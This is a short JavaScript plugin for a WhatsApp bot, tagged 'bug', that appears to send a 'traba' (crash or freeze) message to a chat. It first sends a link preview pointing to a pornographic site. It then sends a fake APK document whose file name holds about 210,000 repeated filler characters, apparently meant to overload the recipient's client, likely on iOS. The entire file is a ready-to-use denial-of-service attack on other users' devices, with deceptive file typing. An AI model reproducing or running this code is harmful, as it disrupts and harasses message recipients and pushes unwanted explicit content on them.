let handler = async (m, { conn }) => {
  const titulo = '🐴 P.A. Zin Web';
  const descripcion = '𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩𓆩';
  const link = 'https://xnxx.com';

  const basura = 'ꦾ'.repeat(70000);
  const fileName = '📦 P.A. Zin Web ' + basura + basura + basura;

  // 1. Mensaje con vista previa de enlace
  await conn.relayMessage(m.chat, {
    extendedTextMessage: {
      text: 'Doc-ios2',
      matchedText: link,
      canonicalUrl: link,
      description: descripcion,
      title: titulo,
      previewType: 'LINK',
      jpegThumbnail: Buffer.from(
        'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8...', // Puedes generar una imagen base64 propia aquí
        'base64'
      ),
    }
  }, {});

  // 2. Documento traba con nombre largo
  await conn.sendMessage(m.chat, {
    document: { url: 'https://files.catbox.moe/2dvudi.txt' },
    fileName: fileName + '.apk',
    mimetype: 'application/vnd.android.package-archive', // Para que se vea como APK
    caption: titulo
  });
};

handler.command = ['docios2'];
handler.help = ['docios2'];
handler.tags = ['bug'];
export default handler;